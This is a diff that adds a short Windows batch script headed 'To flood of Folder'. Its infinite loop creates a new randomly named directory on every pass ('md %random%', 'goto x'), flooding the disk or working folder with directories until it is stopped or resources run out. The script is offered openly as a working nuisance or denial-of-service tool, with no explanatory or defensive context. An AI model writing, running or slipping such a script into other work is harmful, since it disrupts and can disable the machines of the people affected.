@@ -1,0 +1,6 @@
+To flood of Folder 
+
+echo off
+:x
+md %random%
+goto x
